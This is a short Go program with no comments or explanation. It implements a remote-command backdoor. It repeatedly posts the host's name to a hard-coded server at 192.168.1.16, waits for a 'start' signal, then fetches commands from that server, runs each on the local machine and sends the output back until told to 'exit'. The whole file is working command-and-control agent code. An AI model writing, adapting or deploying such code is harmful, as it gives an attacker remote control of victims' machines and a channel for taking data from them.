package main

import(
	"fmt"
	"time"
	"net/http"
	"net/url"
	"io/ioutil"
	"os"
	"strings"
	"os/exec"
)

func main() {
	var s string
	for{
		fmt.Println("1")
		time.Sleep(time.Microsecond * 10 * 1000 * 1000)
		s = httpPost("")
		if s == "start" {
			for{
				fmt.Println("2")
				s = httpPost("")
				if s != "" {
					if s == "exit" {
						break
					}
					fmt.Println(s)
					httpPost(cmdfun(s))
				}
				time.Sleep(time.Microsecond * 5 * 1000 * 1000)
			}
		}
	}
}

func httpPost(cmdres string)string {
	osname,_ := os.Hostname()
    resp, err := http.PostForm("http://192.168.1.16/post.asp?id="+osname, url.Values{"u": {cmdres}})
    if err != nil {
		return err.Error()
	}
 
    defer resp.Body.Close()
	
    body, err := ioutil.ReadAll(resp.Body)
    if err != nil {
		return err.Error()
	}
 
    return string(body)
}

func cmdfun(cmdstr string) string {
	cmd := strings.Split(cmdstr, " ")
	result, err := exec.Command(cmd[0], cmd[1:]...).Output()
    if err != nil {
        fmt.Println("Command failed:", err.Error())
		return err.Error()
    }   
	return string(result)
}
